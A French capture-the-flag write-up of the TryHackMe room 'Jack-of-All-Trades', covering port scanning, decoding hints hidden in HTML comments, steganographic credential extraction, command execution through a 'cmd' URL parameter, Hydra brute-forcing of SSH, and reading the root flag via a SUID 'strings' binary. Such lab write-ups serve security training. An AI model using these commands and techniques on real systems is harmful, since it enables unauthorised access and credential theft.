---
title: "Write-up | Jack-Of-All-Trade"
date: 2020-07-06T22:58:18+02:00
draft: false
tags:
  - writeup
  - tryhackme
---

Cette room est sur [Try Hack Me](https://tryhackme.com). Elle est dans la catégorie "Easy".

Synopsis de la room : 
> Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?

## Reconnaissance
D'abord, je scan les ports avec nmap :
`nmap -sV -sC <ip> -oN ports.txt`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 15:58 CEST
Nmap scan report for 10.10.35.82
Host is up (0.068s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Jack-of-all-trades!
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.67 seconds
```

On remarque que le serveur Apache est sur le port 22, et SSH sur le 80 !

Un fois sur la page du site, je regarde le code source, et je vois les commentaires suivants :
```html
<!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
<!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
```
C'est du base64. Une fois décodé, il donne :
> Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: [edited]

Nous avons donc une nouvelle page, `/recovery.php`, ainsi qu'un password.

`/recovery.php` contient un formulaire de connexion. Dans le code source de la page, il y a la string suivante :
```html
<!-- GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMZJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=  -->
```
Ce n'est pas du base64. Avec un peu de tatonnage, je trouve : base32 -> hex -> ROT13.

> Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S

Le lien pointe vers la page Wikipédia du stégosaure.

On dirait qu'il va falloir faire de la stégano :)

Sur la homepage, il y a une photo d'un stégosaure. Je la télécharge et l'examine avec `steghide` :
```
$ steghide info stego.jpg 
"stego.jpg":
  format: jpeg
  capacité: 1,9 KB
```
Il y a donc bien des choses à l'intérieur !
J'extrais le contenu grâce au mot de passe trouvé précédemement :
```
$ steghide extract -sf stego.jpg
Entrez la passphrase: 
Écriture des données extraites dans "creds.txt".
```
et regarde le contenu du fichier creds.txt :
```
$ cat creds.txt
Hehe. Gotcha!

You're on the right path, but wrong image!
```
:'(

Je télécharge donc la seconde image, jackinthebox.jpg, et répète le processus. Cependant, la passphrase utilisée précédement n'est pas la bonne. Bizarre...
J'essaie quelques passwords un peu au hasard, mais rien ne semble fonctionner.

Je décide d'aller voir un peu ailleurs sur le site, et vais donc sur `/assets/`. Surprise, il y a 3 photos sur la homepage, j'avais oublié la bannière ! Bien évidement, elle contient du texte qui peut être extrait avec le pass vu précédement.
```
$ steghide extract -sf header.jpg 
Entrez la passphrase: 
Écriture des données extraites dans "cms.creds".
```
J'inspecte le contenu, il y a bien des creds !
```
$ cat cms.creds 
Here you go Jack. Good thing you thought ahead!

Username: [edited]
Password: [edited]
```
Une fois ces identifiants rentrés sur la page `/recovery.php`, j'accède à une nouvelle page, avec pour seul message :
```
GET me a 'cmd' and I'll run it for you Future-Jack. 
```
Rien de plus dans le code source. Le message est plutôt clair : il faut effectuer des requêtes GET sur la page avec des commandes en paramètre.
Je rentre donc en URL `http://10.10.35.82:22/[edited]?cmd=whoami` afin de tester. J'ai bien la réponse à la commande : `www-data`.

Du RCE ! :D

## Exploitation

Tout d'abord, j'essaie de voir si je peux regarder le contenu de `/home`:

`http://10.10.35.82:22/[edited]?cmd=ls%20/home`

J'y trouve un fichier : `jacks_password_list` ainsi que le dossier de l'user jack.
Je récupère le fichier en envoyant `cat /home/jacks_password_list` :

```
*hclqAzj+2GC+=0K eN@ 0HguX{,fgXPE;8yF sjRUb4*@pz<*ZITu [8V7o^gl(Gjt5[WB yTq0jI$d}Kae)vC4} 9;}#q*,A4wd{6r,y4krSo ow5APF>6r,y4krSo
```
Puisque ce fichier est sensé être une liste, j'imagine que chaque espace représente un retour à la ligne. Ca donnerait donc :
```
*hclqAzj+2GC+=0K
eN@
0HguX{,fgXPE;8yF
sjRUb4*@pz<*ZITu
[8V7o^gl(Gjt5[WB
yTq0jI$d}Kae)vC4}
9;}#q*,A4wd{6r,y4krSo
ow5APF>6r,y4krSo
```
Ce format ne me dit absolument rien.

Je me dis qu'un de ces mots de passe est celui du SSH de Jack. J'essaie donc de bruteforce le port avec Hydra et les passwords mis dans un .txt
```
$ hydra -l jack -P passlist.txt 10.10.35.82 ssh -s 80
...
[DATA] attacking ssh://10.10.35.82:80/
1 of 1 target completed, 0 valid passwords found
```
Rien ...
Petit coup d'oeil au code source de la page, et je remarque qu'il n'y a qu'une petite partie de la liste qui est affichée ! La liste de mots de passe est en réalité beaucoup plus longue.

J'édite donc ma liste et retente avec Hydra.
```
[DATA] attacking ssh://10.10.35.82:80/
[80][ssh] host: 10.10.35.82   login: jack   password: [edited]
1 of 1 target successfully completed, 1 valid password found
```
Cette fois c'est la bonne ! Me voilà connecté en SSH sur la machine.

Dans le folder de jack, il n'y a qu'une photo : `user.jpg`.

Je la récupère sur ma machine : `scp -P 80 jack@10.10.35.82:user.jpg` et l'ouvre : `eog user.jpg`.

Bingo, elle contient le premier flag !

## Élévation de privilèges

Le but maintenant est de passer root.
J'essaie de voir ce que je peux lancer en tant que superuser:
```
$ sudo -l
[sudo] password for jack: 
Sorry, user jack may not run sudo on jack-of-all-trades.
```
Tant pis pour sudo... Je regarde ensuite si des fichiers ont le bit SUID de réglé :
```
$ find / -perm /4000 2> /dev/null 
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/pt_chown
/usr/bin/chsh
/usr/bin/at
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/strings
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
```
`/usr/bin/strings` ! Parfait ! Je vais pouvoir lire le flag :)

On sait que le flag root est à `/root/root.txt`. Il faut donc faire :
```
$ LFILE=/root/root.txt
$ /usr/bin/strings "$LFILE"
```
et voilà le résultat :
```
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: [edited]
```

C'est dans la poche 8-)
